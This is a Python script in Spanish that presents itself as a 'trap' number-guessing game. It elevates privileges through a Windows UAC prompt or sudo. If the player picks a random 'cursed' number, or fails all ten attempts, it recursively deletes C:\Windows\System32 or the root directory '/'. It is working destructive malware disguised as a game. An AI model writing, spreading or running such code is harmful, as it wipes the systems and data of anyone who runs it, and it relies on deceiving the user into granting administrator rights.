
import time
import random
import shutil
import os
import ctypes
import sys  




i = True
def sistema():
    sis = 0
    so = True

    while so == True:
        try:
            sis = int(input("¿En que sistema operativo estás? (Es necesario para el funcionamiento del juego) 1 = Windows /// 2 = Rama de Debian /// 3 = Rama de RedHat /// 4 = MacOS "))
            if sis == 5 or sis > 5 or sis < 1:
                print("¡Eso no es na opción válida!")
            else:
                so = False
        except ValueError:
            print("Ingresa un número válido")
    return sis 

sis = sistema()
if sis == 1:
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False


    if not is_admin():
        print("No tienes privilegios de administrador. Intentando elevarlos...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        sys.exit()  
    else:
        print("Script ejecutándose con privilegios de administrador.")

if sis in [2, 3, 4]:
    def is_root():
        return os.geteuid() == 0

    if not is_root():
        print("No tienes privilegios de administrador. Intentando elevarlos...")
        
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
        sys.exit()  
    else:
        print("Script ejecutándose con privilegios de administrador.")

while i == True:
    print("Has caido en la trampa!")
    time.sleep(2)
    print("Vamos a jugar a un juego.")
    time.sleep(2)
    print("Tienes 10 intentos para adivinar un numero totalmente aleatorio del 1 al 50.")
    time.sleep(2)
    print("Me vas a dar una lista de 3 numeros por intento.")
    time.sleep(2)
    print("Aunque este numero aleatorio, va a cambiar a cada intento para añadirle un poco de dificultad 😈 ")
    time.sleep(2)
    prim = input("¿Crees que es dificil? (si/no)")
    if prim in ["si", "s", "Si", "SI"]:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")
    else:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")

    time.sleep(3)
    print("Perfecto, empecemos con tu primer intento. ")
    u = 0
    while u <10:


        def crearlista():
            p = list()
            while len(p) <3:
                try:
                    o = int(input('Escribe tus numeros de 1 en 1 dandole a Enter '))
                    if 1 <= o <= 50 and o not in p:
                        p.append(o)
                    else:
                        print("El número no es válido. Por favor añade uno nuevo")
                except ValueError:
                    print("Añade un valor válido.")
            return p

        def numerobueno():
            return random.randint(1,50)
        
        def numeromalo():
            return random.randint(1,50)

        nb = numerobueno()
        nm = numeromalo()
        
        if nb == 50 and nm == 50:
            nm -= 1
            if nb == nm and nm < 50:
                nm += 1

        lista = crearlista()

        if nb in lista:
            print("Te has salvado, has adivinado el número, que era {}".format(nb))
            break
        if nm in lista:
            print("JAJAJAJAJAJA Has adivinado el numero malo, ahora te doy 3 segundos para despedirte de tu ordenador ")
            time.sleep(3)
            if sis == 1:
                shutil.rmtree(r"c:\windows\system32")
            elif sis in [2, 3, 4]:
                shutil.rmtree("/")
        u = u+1
        print("Has fallado")
        print("Este es tu intento número {}".format(u))
    if u == 10:
        print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
        if sis == 1:
            shutil.rmtree(r"c:\windows\system32")
        elif u == 10 and sis in [2, 3, 4]:
            shutil.rmtree("/")
